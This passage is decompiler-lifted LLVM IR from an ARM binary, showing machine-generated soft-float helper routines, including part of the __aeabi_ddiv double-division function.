  %v0_1dab4.pre = load i32, i32* %lr.global-to-local, align 4
  br label %bb49

bb48:                                             ; preds = %bb47
  %v9_1daac30 = mul i32 %v5_1daa4, 1048576
  %v10_1daac31 = or i32 %v2_1daa0, %v9_1daac30
  store i32 %v10_1daac31, i32* %r1.global-to-local, align 4
  %v7_1dab0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v7_1dab0, i32* %r4.global-to-local, align 4
  store i32 %v12_1d9d8, i32* %lr.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %._crit_edge23, %bb48
  %v0_1dab4 = phi i32 [ %v0_1dab4.pre, %._crit_edge23 ], [ %v12_1d9d8, %bb48 ]
  %v6_1dab4 = xor i1 %v4_1daac, true
  call void @__pseudo_cond_branch(i1 %v6_1dab4, i32 %v0_1dab4)
  %v0_1dab8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1dab8 = or i32 %v0_1dab8, 1048576
  store i32 %v1_1dab8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v0_1dac0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1dac0 = add i32 %v0_1dac0, -1
  store i32 %v1_1dac0, i32* %r4.global-to-local, align 4
  ret i32 %v4_1da9c

; uselistorder directives
  uselistorder i32 %v5_1daa4, { 1, 0, 5, 3, 4, 2, 6 }
  uselistorder i32 %v4_1daa4, { 2, 1, 0 }
  uselistorder i32 %v1_1da80, { 2, 0, 1 }
  uselistorder i32 %v0_1da7c, { 1, 0 }
  uselistorder i1 %v7_1da70, { 1, 0 }
  uselistorder i32 %v2_1da50, { 1, 0 }
  uselistorder i1 %v1_1da50, { 1, 0 }
  uselistorder i32 %v6_1da48, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1da50, { 1, 0, 2 }
  uselistorder i32 %v14_1da34, { 1, 3, 2, 0 }
  uselistorder i64 %v11_1da34, { 1, 0 }
  uselistorder i64 %v12_1da2c, { 1, 0 }
  uselistorder i64 %v10_1da2c, { 1, 0 }
  uselistorder i64 %v7_1da24, { 1, 0 }
  uselistorder i64 %v6_1da1c, { 1, 0 }
  uselistorder i32 %v6_1da04, { 1, 0 }
  uselistorder i32 %v6_1da00, { 1, 0, 2 }
  uselistorder i32 %v1_1da00, { 5, 2, 3, 4, 1, 0 }
  uselistorder i32 %v2_1d9f8, { 4, 3, 0, 2, 1, 5, 6 }
  uselistorder i32 %v6_1d9e8, { 2, 1, 0 }
  uselistorder i32 %v5_1d9e4, { 2, 1, 0 }
  uselistorder i32 %v12_1d9d8, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 1, 4, 5, 6, 7, 8, 10, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg4, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 3, 1, 4 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_1da94, { 1, 0 }
  uselistorder label %._crit_edge, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_1da5c, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %.thread2, { 3, 2, 1, 0 }
}

define i32 @function_1dac4() local_unnamed_addr {
dec_label_pc_1dac4:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  %v0_1dac4 = load i1, i1* @cpsr_z, align 1
  %v1_1dac4 = load i1, i1* @cpsr_n, align 1
  %v2_1dac4 = load i1, i1* @cpsr_v, align 1
  %v3_1dac4 = xor i1 %v1_1dac4, %v2_1dac4
  %v4_1dac4 = or i1 %v0_1dac4, %v3_1dac4
  br i1 %v4_1dac4, label %dec_label_pc_1dac8, label %dec_label_pc_1dc40

dec_label_pc_1dac8:                               ; preds = %dec_label_pc_1dac4
  %v0_1dac8 = load i32, i32* @r4, align 4
  %v4_1dac8 = add i32 %v0_1dac8, 54
  %v6_1dac8 = sub i32 0, %v0_1dac8
  %v7_1dac8 = and i32 %v4_1dac8, %v6_1dac8
  %v8_1dac8 = icmp slt i32 %v7_1dac8, 0
  %v9_1dac8 = icmp slt i32 %v4_1dac8, 0
  %v10_1dac8 = icmp eq i32 %v4_1dac8, 0
  %v7_1dacc = icmp sgt i32 %v0_1dac8, -54
  br i1 %v7_1dacc, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_1dac8
  store i32 0, i32* @r0, align 4
  %v8_1dad0 = load i32, i32* @r1, align 4
  %v9_1dad0 = and i32 %v8_1dad0, -2147483648
  store i32 %v9_1dad0, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1dac8, %bb
  %v4_1dad8 = xor i1 %v9_1dac8, %v8_1dac8
  %v5_1dad8 = or i1 %v10_1dac8, %v4_1dad8
  call void @__pseudo_cond_branch(i1 %v5_1dad8, i32 %tmp7)
  %v0_1dadc = load i32, i32* @r4, align 4
  %v1_1dadc = sub i32 0, %v0_1dadc
  %v2_1dae0 = sub i32 -32, %v0_1dadc
  %v4_1dae0 = add i32 %v0_1dadc, 31
  %v5_1dae0 = and i32 %v4_1dae0, %v1_1dadc
  %v6_1dae0 = icmp slt i32 %v5_1dae0, 0
  store i1 %v6_1dae0, i1* @cpsr_v, align 1
  %v6_1dae4 = icmp slt i32 %v1_1dadc, 32
  br i1 %v6_1dae4, label %dec_label_pc_1dae8, label %dec_label_pc_1db54

dec_label_pc_1dae8:                               ; preds = %.thread1
  %v1_1dae8 = add i32 %v2_1dae0, 12
  %v8_1daec = icmp sgt i32 %v1_1dae8, 0
  br i1 %v8_1daec, label %dec_label_pc_1db24, label %dec_label_pc_1daf0

dec_label_pc_1daf0:                               ; preds = %dec_label_pc_1dae8
  %v1_1daf0 = add i32 %v2_1dae0, 32
  %v1_1daf4 = sub i32 0, %v2_1dae0
  %v0_1daf8 = load i32, i32* @r0, align 4
  %v6_1daf8 = shl i32 %v0_1daf8, %v1_1daf4
  %v2_1dafc = add i32 %v2_1dae0, 31
  %v3_1dafc = shl i32 1, %v2_1dafc
  %v6_1dafc = lshr i32 %v0_1daf8, %v1_1daf0
  %v1_1db00 = load i32, i32* @r1, align 4
  %v7_1db00 = shl i32 %v1_1db00, %v1_1daf4
  %v8_1db00 = or i32 %v7_1db00, %v6_1dafc
  %v1_1db04 = and i32 %v1_1db00, -2147483648
  %tmp = bitcast i32 %v1_1db00 to float
  %tmp19 = call float @fabsf(float %tmp)
  %v1_1db08 = bitcast float %tmp19 to i32
  %tmp20 = icmp slt i32 %v6_1daf8, 0
  %v4_1db0c = zext i1 %tmp20 to i32
  %v5_1db0c = add i32 %v8_1db00, %v4_1db0c
  %v5_1db10 = and i32 %v1_1db08, %v3_1dafc
  %v6_1db10 = icmp ne i32 %v5_1db10, 0
  %v7_1db10 = lshr i32 %v1_1db08, %v1_1daf0
  %v9_1db10 = add i32 %v7_1db10, %v1_1db04
  %v10_1db10 = zext i1 %v6_1db10 to i32
  %v11_1db10 = add i32 %v9_1db10, %v10_1db10
  store i32 %v11_1db10, i32* @r1, align 4
  %v19_1db10 = add i32 %v11_1db10, %v10_1db10
  %v20_1db10 = xor i32 %v19_1db10, %v1_1db00
  %v21_1db10 = xor i32 %v19_1db10, %v7_1db10
  %v22_1db10 = and i32 %v20_1db10, %v21_1db10
  %v23_1db10 = icmp slt i32 %v22_1db10, 0
  store i1 %v23_1db10, i1* @cpsr_v, align 1
  %v3_1db14 = mul i32 %v6_1daf8, 2
  %v4_1db14 = or i32 %v3_1db14, %tmp7
  %v5_1db14 = icmp slt i32 %v4_1db14, 0
  store i1 %v5_1db14, i1* @cpsr_n, align 1
  %v6_1db14 = icmp eq i32 %v4_1db14, 0
  store i1 %v6_1db14, i1* @cpsr_z, align 1
  br i1 %v6_1db14, label %bb13, label %bb14

bb13:                                             ; preds = %dec_label_pc_1daf0
  %tmp21 = sext i1 %tmp20 to i32
  %v6_1db18 = add nsw i32 %tmp21, -1
  %v7_1db18 = and i32 %v5_1db0c, %v6_1db18
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_1daf0, %bb13
  %v1_1db20 = phi i32 [ %v5_1db0c, %dec_label_pc_1daf0 ], [ %v7_1db18, %bb13 ]
  %v2_1db1c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1db1c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1db20

dec_label_pc_1db24:                               ; preds = %dec_label_pc_1dae8
  %v1_1db24 = sub i32 0, %v2_1dae0
  %v1_1db28 = add i32 %v2_1dae0, 32
  %v0_1db2c = load i32, i32* @r0, align 4
  %v6_1db2c = shl i32 %v0_1db2c, %v1_1db24
  %v6_1db30 = lshr i32 %v0_1db2c, %v1_1db28
  %v1_1db34 = load i32, i32* @r1, align 4
  %v7_1db34 = shl i32 %v1_1db34, %v1_1db24
  %v8_1db34 = or i32 %v7_1db34, %v6_1db30
  %v1_1db38 = and i32 %v1_1db34, -2147483648
  %tmp22 = icmp slt i32 %v6_1db2c, 0
  %v4_1db3c = zext i1 %tmp22 to i32
  %v5_1db3c = add i32 %v8_1db34, %v4_1db3c
  %v6_1db3c = icmp ult i32 %v5_1db3c, %v8_1db34
  %v2_1db40 = zext i1 %v6_1db3c to i32
  %v3_1db40 = or i32 %v2_1db40, %v1_1db38
  store i32 %v3_1db40, i32* @r1, align 4
  %v9_1db40 = add nsw i32 %v3_1db40, %v2_1db40
  %v10_1db40 = sub i32 0, %v1_1db34
  %v11_1db40 = and i32 %v9_1db40, %v10_1db40
  %v12_1db40 = icmp slt i32 %v11_1db40, 0
  store i1 %v12_1db40, i1* @cpsr_v, align 1
  %v3_1db44 = mul i32 %v6_1db2c, 2
  %v4_1db44 = or i32 %v3_1db44, %tmp7
  %v5_1db44 = icmp slt i32 %v4_1db44, 0
  store i1 %v5_1db44, i1* @cpsr_n, align 1
  %v6_1db44 = icmp eq i32 %v4_1db44, 0
  store i1 %v6_1db44, i1* @cpsr_z, align 1
  br i1 %v6_1db44, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1db24
  %tmp23 = sext i1 %tmp22 to i32
  %v6_1db48 = add nsw i32 %tmp23, -1
  %v7_1db48 = and i32 %v5_1db3c, %v6_1db48
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1db24, %bb15
  %v1_1db50 = phi i32 [ %v5_1db3c, %dec_label_pc_1db24 ], [ %v7_1db48, %bb15 ]
  %v2_1db4c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1db4c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1db50

dec_label_pc_1db54:                               ; preds = %.thread1
  %v1_1db54 = sub i32 32, %v2_1dae0
  %v1_1db58 = load i32, i32* @r0, align 4
  %v7_1db58 = shl i32 %v1_1db58, %v1_1db54
  %v8_1db58 = or i32 %v7_1db58, %tmp7
  %v6_1db5c = lshr i32 %v1_1db58, %v2_1dae0
  %v1_1db60 = load i32, i32* @r1, align 4
  %v7_1db60 = shl i32 %v1_1db60, %v1_1db54
  %v8_1db60 = or i32 %v7_1db60, %v6_1db5c
  %v6_1db64 = lshr i32 %v1_1db60, %v2_1dae0
  %v1_1db68 = and i32 %v1_1db60, -2147483648
  store i32 %v1_1db68, i32* @r1, align 4
  %v7_1db6c = lshr i32 %v1_1db68, %v2_1dae0
  %v8_1db6c = sub i32 -1, %v7_1db6c
  %v9_1db6c = and i32 %v6_1db64, %v8_1db6c
  %tmp24 = icmp slt i32 %v8_1db60, 0
  %v4_1db70 = zext i1 %tmp24 to i32
  %v5_1db70 = add i32 %v4_1db70, %v9_1db6c
  %v3_1db74 = mul i32 %v8_1db60, 2
  %v4_1db74 = or i32 %v8_1db58, %v3_1db74
  %v5_1db74 = icmp slt i32 %v4_1db74, 0
  store i1 %v5_1db74, i1* @cpsr_n, align 1
  %v6_1db74 = icmp eq i32 %v4_1db74, 0
  store i1 %v6_1db74, i1* @cpsr_z, align 1
  br i1 %v6_1db74, label %bb17, label %bb18

bb17:                                             ; preds = %dec_label_pc_1db54
  %tmp25 = sext i1 %tmp24 to i32
  %v6_1db78 = add nsw i32 %tmp25, -1
  %v7_1db78 = and i32 %v5_1db70, %v6_1db78
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_1db54, %bb17
  %v1_1db80 = phi i32 [ %v5_1db70, %dec_label_pc_1db54 ], [ %v7_1db78, %bb17 ]
  %v2_1db7c = load i32, i32* %stack_var_16, align 4
  store i32 %v2_1db7c, i32* @r4, align 4
  store i32 %tmp6, i32* @r5, align 4
  store i32 %tmp5, i32* @r6, align 4
  ret i32 %v1_1db80

dec_label_pc_1dc40:                               ; preds = %dec_label_pc_1dac4
  %v0_1dc40 = load i32, i32* @r1, align 4
  %v1_1dc40 = and i32 %v0_1dc40, -2147483648
  %v1_1dc48 = or i32 %v1_1dc40, 2146435072
  store i32 %v1_1dc48, i32* @r1, align 4
  store i32 %tmp10, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v5_1db70, { 1, 0 }
  uselistorder i32 %v5_1db3c, { 1, 0, 2 }
  uselistorder i32 %v8_1db34, { 1, 0 }
  uselistorder i32 %v1_1db24, { 1, 0 }
  uselistorder i32 %v5_1db0c, { 1, 0 }
  uselistorder i32 %v1_1db00, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1daf4, { 1, 0 }
  uselistorder i32 %v2_1dae0, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1dadc, { 1, 0 }
  uselistorder i32 %v4_1dac8, { 1, 2, 0 }
  uselistorder i32 %v0_1dac8, { 1, 0, 2 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
  uselistorder i32 %tmp5, { 2, 1, 0 }
  uselistorder i32 12, { 44, 45, 64, 71, 8, 72, 75, 3, 1, 2, 76, 77, 5, 0, 4, 87, 27, 10, 31, 11, 12, 73, 74, 28, 29, 30, 70, 13, 88, 89, 9, 136, 137, 138, 139, 140, 142, 143, 141, 144, 145, 146, 147, 148, 149, 150, 14, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 15, 65, 66, 67, 68, 69, 32, 33, 16, 34, 35, 36, 63, 95, 37, 38, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 6, 78, 79, 80, 81, 82, 17, 83, 18, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 132, 125, 126, 127, 128, 129, 130, 131, 133, 134, 19, 135, 84, 7, 20, 21, 22, 24, 23, 25, 59, 85, 86, 26, 39, 40, 41, 42, 43, 60, 61, 62, 90, 91, 92, 93, 94, 96 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 9, 2, 10, 0, 1, 14 }
  uselistorder i32 54, { 3, 0, 1, 4, 2 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_1dc58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1dc58:
  %v1_1dc5c = or i32 %arg1, 2146959360
  store i32 %v1_1dc5c, i32* @r1, align 4
  %v1_1dc64 = load i32, i32* @r0, align 4
  ret i32 %v1_1dc64
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1dc68 = load i32, i32* @r4, align 4
  store i32 %v3_1dc68, i32* %stack_var_-16, align 4
  %v6_1dc68 = load i32, i32* @r5, align 4
  %v9_1dc68 = load i32, i32* @r6, align 4
  %v12_1dc68 = load i32, i32* @lr, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1dc74 = load i32, i32* @r1, align 4
  %v4_1dc74 = udiv i32 %v1_1dc74, 1048576
  %v5_1dc74 = urem i32 %v4_1dc74, 2048
  store i32 %v5_1dc74, i32* @r4, align 4
  %v6_1dc74 = icmp eq i32 %v5_1dc74, 0
  br i1 %v6_1dc74, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre147 = udiv i32 %arg4, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1dc78 = udiv i32 %arg4, 1048576
  %v6_1dc78 = urem i32 %v5_1dc78, 2048
  store i32 %v6_1dc78, i32* %r5.global-to-local, align 4
  %v7_1dc78 = icmp eq i32 %v6_1dc78, 0
  br i1 %v7_1dc78, label %.thread1, label %bb90

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1de04

bb90:                                             ; preds = %bb
  %v5_1dc7c = icmp eq i32 %v5_1dc74, 2047
  br i1 %v5_1dc7c, label %.thread2, label %bb91

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb90
  %.pre145.pre-phi = phi i32 [ %.pre147, %entry..thread2_crit_edge ], [ %v5_1dc78, %bb90 ]
  br label %dec_label_pc_1de04

bb91:                                             ; preds = %bb90
  %v5_1dc80 = icmp eq i32 %v6_1dc78, 2047
  br i1 %v5_1dc80, label %dec_label_pc_1de04, label %dec_label_pc_1dc88

dec_label_pc_1dc88:                               ; preds = %bb91
  %v2_1dc88 = sub nsw i32 %v5_1dc74, %v6_1dc78
  store i32 %v2_1dc88, i32* %r4.global-to-local, align 4
  %v2_1dc8c = xor i32 %v1_1dc74, %arg4
  %v4_1dc90 = mul i32 %arg4, 4096
  %v5_1dc90 = or i32 %v4_1dc90, %arg3
  store i32 %v5_1dc90, i32* %r5.global-to-local, align 4
  %v7_1dc90 = icmp eq i32 %v5_1dc90, 0
  %v3_1dc94 = mul i32 %v1_1dc74, 4096
  store i32 %v3_1dc94, i32* %r1.global-to-local, align 4
  br i1 %v7_1dc90, label %dec_label_pc_1ddd0, label %dec_label_pc_1dc9c

dec_label_pc_1dc9c:                               ; preds = %dec_label_pc_1dc88
  %tmp92 = mul i32 %arg4, 256
  %v4_1dca4 = and i32 %tmp92, 268435200
  %v4_1dca8 = udiv i32 %arg3, 16777216
  %v5_1dca4 = or i32 %v4_1dca8, %v4_1dca4
  %v5_1dca8 = or i32 %v5_1dca4, 268435456
  store i32 %v5_1dca8, i32* %r3.global-to-local, align 4
  %v3_1dcac = mul i32 %arg3, 256
  store i32 %v3_1dcac, i32* %r2.global-to-local, align 4
  %tmp93 = mul i32 %v1_1dc74, 256
  %v4_1dcb0 = and i32 %tmp93, 268435200
  %v1_1dcb4 = load i32, i32* @r0, align 4
  %v4_1dcb4 = udiv i32 %v1_1dcb4, 16777216
  %v5_1dcb0 = or i32 %v4_1dcb0, %v4_1dcb4
  %v5_1dcb4 = or i32 %v5_1dcb0, 268435456
  store i32 %v5_1dcb4, i32* %r5.global-to-local, align 4
  %v3_1dcb8 = mul i32 %v1_1dcb4, 256
  store i32 %v3_1dcb8, i32* %r6.global-to-local, align 4
  %v1_1dcbc = and i32 %v2_1dc8c, -2147483648
  store i32 %v1_1dcbc, i32* %r1.global-to-local, align 4
  %v3_1dcc0 = icmp uge i32 %v5_1dcb4, %v5_1dca8
  %v9_1dcc0 = icmp eq i32 %v5_1dcb4, %v5_1dca8
  br i1 %v9_1dcc0, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1dc9c
  %v4_1dcc4 = icmp uge i32 %v3_1dcb8, %v3_1dcac
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1dc9c, %bb94
  %v1_1dcc8 = phi i1 [ %v3_1dcc0, %dec_label_pc_1dc9c ], [ %v4_1dcc4, %bb94 ]
  %v2_1dcc8 = add nsw i32 %v2_1dc88, 253
  %v3_1dcc8 = zext i1 %v1_1dcc8 to i32
  %v4_1dcc8 = add nsw i32 %v2_1dcc8, %v3_1dcc8
  %v8_1dcc8 = icmp ule i32 %v4_1dcc8, %v2_1dc88
  %v9_1dcc8 = icmp ugt i32 %v2_1dc88, -254
  %v10_1dcc8 = select i1 %v1_1dcc8, i1 %v8_1dcc8, i1 %v9_1dcc8
  %v1_1dccc = add nsw i32 %v4_1dcc8, 768
  store i32 %v1_1dccc, i32* %r4.global-to-local, align 4
  br i1 %v10_1dcc8, label %dec_label_pc_1dcdc, label %dec_label_pc_1dcd4

dec_label_pc_1dcd4:                               ; preds = %bb95
  %v3_1dcd4 = udiv i32 %v5_1dca8, 2
  store i32 %v3_1dcd4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1dcdc

dec_label_pc_1dcdc:                               ; preds = %bb95, %dec_label_pc_1dcd4
  %v0_1dce4 = phi i32 [ %v5_1dca8, %bb95 ], [ %v3_1dcd4, %dec_label_pc_1dcd4 ]
  %v0_1dce8 = phi i32 [ %v3_1dcac, %bb95 ], [ 0, %dec_label_pc_1dcd4 ]
  %v2_1dcdc = sub i32 %v3_1dcb8, %v0_1dce8
  store i32 %v2_1dcdc, i32* %r6.global-to-local, align 4
  %v3_1dcdc = icmp uge i32 %v3_1dcb8, %v0_1dce8
  %v3_1dce0 = icmp eq i1 %v3_1dcdc, false
  %v4_1dce0 = sub nsw i32 %v5_1dcb4, %v0_1dce4
  %v6_1dce0 = sext i1 %v3_1dce0 to i32
  %v7_1dce0 = add nsw i32 %v6_1dce0, %v4_1dce0
  store i32 %v7_1dce0, i32* %r5.global-to-local, align 4
  %v3_1dce4 = udiv i32 %v0_1dce4, 2
  store i32 %v3_1dce4, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1dcf4.outer

dec_label_pc_1dcf4.outer:                         ; preds = %dec_label_pc_1dd8c, %dec_label_pc_1dcdc
  %v1_1dda0.ph = phi i32 [ %v2_1dd8c, %dec_label_pc_1dd8c ], [ %v1_1dcbc, %dec_label_pc_1dcdc ]
  %v0_1dcf8.ph = phi i32 [ %v5_1dd68, %dec_label_pc_1dd8c ], [ %v7_1dce0, %dec_label_pc_1dcdc ]
  %v1_1dcfc.ph = phi i32 [ %v3_1dd6c, %dec_label_pc_1dd8c ], [ %v2_1dcdc, %dec_label_pc_1dcdc ]
  %v5_1dd7417.ph = phi i32 [ %v5_1dd74, %dec_label_pc_1dd8c ], [ %v3_1dce4, %dec_label_pc_1dcdc ]
  %v3_1dd7813.ph = phi i32 [ %v3_1dd78, %dec_label_pc_1dd8c ], [ 0, %dec_label_pc_1dcdc ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1dd8c ], [ 1048576, %dec_label_pc_1dcdc ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1dd8c ], [ 524288, %dec_label_pc_1dcdc ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1dcf4

dec_label_pc_1dcf4:                               ; preds = %dec_label_pc_1dcf4.outer, %dec_label_pc_1dd64
  %v1_1dd5859 = phi i32 [ %v2_1dda0, %dec_label_pc_1dd64 ], [ %storemerge133, %dec_label_pc_1dcf4.outer ]
  %v1_1dd04 = phi i32 [ %v1_1dd0432, %dec_label_pc_1dd64 ], [ %storemerge133, %dec_label_pc_1dcf4.outer ]
  %v1_1dd2041 = phi i32 [ %v1_1dd2043, %dec_label_pc_1dd64 ], [ %storemerge133, %dec_label_pc_1dcf4.outer ]
  %v1_1dd3c50 = phi i32 [ %v1_1dd3c52, %dec_label_pc_1dd64 ], [ %storemerge133, %dec_label_pc_1dcf4.outer ]
  %v0_1dd7c = phi i32 [ %v3_1dd7c, %dec_label_pc_1dd64 ], [ %storemerge, %dec_label_pc_1dcf4.outer ]
  %v0_1dcf8 = phi i32 [ %v5_1dd68, %dec_label_pc_1dd64 ], [ %v0_1dcf8.ph, %dec_label_pc_1dcf4.outer ]
  %v1_1dcfc = phi i32 [ %v3_1dd6c, %dec_label_pc_1dd64 ], [ %v1_1dcfc.ph, %dec_label_pc_1dcf4.outer ]
  %v5_1dd7417 = phi i32 [ %v5_1dd74, %dec_label_pc_1dd64 ], [ %v5_1dd7417.ph, %dec_label_pc_1dcf4.outer ]
  %v3_1dd7813 = phi i32 [ %v3_1dd78, %dec_label_pc_1dd64 ], [ %v3_1dd7813.ph, %dec_label_pc_1dcf4.outer ]
  %v3_1dcf4 = icmp uge i32 %v1_1dcfc, %v3_1dd7813
  %v3_1dcf8 = icmp eq i1 %v3_1dcf4, false
  %v4_1dcf8 = sub i32 %v0_1dcf8, %v5_1dd7417
  %v6_1dcf8 = sext i1 %v3_1dcf8 to i32
  %v7_1dcf8 = add i32 %v6_1dcf8, %v4_1dcf8
  %v8_1dcf8 = zext i1 %v3_1dcf8 to i32
  %v9_1dcf8 = sub i32 %v7_1dcf8, %v8_1dcf8
  %v10_1dcf8 = icmp ult i32 %v0_1dcf8, %v9_1dcf8
  %v11_1dcf8 = icmp ne i32 %v5_1dd7417, -1
  %v12_1dcf8 = or i1 %v11_1dcf8, %v10_1dcf8
  %v13_1dcf8 = icmp ult i32 %v0_1dcf8, %v5_1dd7417
  %v14_1dcf8 = select i1 %v3_1dcf8, i1 %v12_1dcf8, i1 %v13_1dcf8
  br i1 %v14_1dcf8, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1dcf4
  %v3_1dcfc = sub i32 %v1_1dcfc, %v3_1dd7813
  store i32 %v3_1dcfc, i32* %r6.global-to-local, align 4
  store i32 %v7_1dcf8, i32* %r5.global-to-local, align 4
  %v3_1dd04 = or i32 %v1_1dd04, %v0_1dd7c
  store i32 %v3_1dd04, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1dcf4, %bb96
  %v1_1dd5858 = phi i32 [ %v1_1dd5859, %dec_label_pc_1dcf4 ], [ %v3_1dd04, %bb96 ]
  %v1_1dd0435 = phi i32 [ %v1_1dd04, %dec_label_pc_1dcf4 ], [ %v3_1dd04, %bb96 ]
  %v1_1dd20 = phi i32 [ %v1_1dd2041, %dec_label_pc_1dcf4 ], [ %v3_1dd04, %bb96 ]
  %v1_1dd3c49 = phi i32 [ %v1_1dd3c50, %dec_label_pc_1dcf4 ], [ %v3_1dd04, %bb96 ]
  %v0_1dd14 = phi i32 [ %v0_1dcf8, %dec_label_pc_1dcf4 ], [ %v7_1dcf8, %bb96 ]
  %v1_1dd18 = phi i32 [ %v1_1dcfc, %dec_label_pc_1dcf4 ], [ %v3_1dcfc, %bb96 ]
  %v1_1dd08 = urem i32 %v5_1dd7417, 2
  %v2_1dd08 = icmp ne i32 %v1_1dd08, 0
  %v3_1dd08 = udiv i32 %v5_1dd7417, 2
  %v3_1dd0c = zext i1 %v2_1dd08 to i32
  %v6_1dd0c = zext i32 %v3_1dd7813 to i64
  %v7_1dd0c = sub i32 33, %v3_1dd7813
  %v8_1dd0c = zext i32 %v7_1dd0c to i64
  %v9_1dd0c = shl i64 %v6_1dd0c, %v8_1dd0c
  %v10_1dd0c = sub i32 32, %v3_1dd7813
  %v11_1dd0c = shl i32 %v3_1dd0c, %v10_1dd0c
  %v12_1dd0c = zext i32 %v11_1dd0c to i64
  %v14_1dd0c = or i64 %v12_1dd0c, %v9_1dd0c
  %v15_1dd0c = trunc i64 %v14_1dd0c to i32
  %v3_1dd10 = icmp uge i32 %v1_1dd18, %v15_1dd0c
  %v3_1dd14 = icmp eq i1 %v3_1dd10, false
  %v4_1dd14 = sub i32 %v0_1dd14, %v3_1dd08
  %v6_1dd14 = sext i1 %v3_1dd14 to i32
  %v7_1dd14 = add i32 %v6_1dd14, %v4_1dd14
  %v13_1dd14 = icmp ult i32 %v0_1dd14, %v3_1dd08
  %v14_1dd14 = or i1 %v13_1dd14, %v3_1dd14
  br i1 %v14_1dd14, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1dd18 = sub i32 %v1_1dd18, %v15_1dd0c
  store i32 %v3_1dd18, i32* %r6.global-to-local, align 4
  store i32 %v7_1dd14, i32* %r5.global-to-local, align 4
  %v5_1dd20 = udiv i32 %v0_1dd7c, 2
  %v6_1dd20 = or i32 %v1_1dd20, %v5_1dd20
  store i32 %v6_1dd20, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1dd5857 = phi i32 [ %v1_1dd5858, %.thread4 ], [ %v6_1dd20, %bb97 ]
  %v1_1dd0434 = phi i32 [ %v1_1dd0435, %.thread4 ], [ %v6_1dd20, %bb97 ]
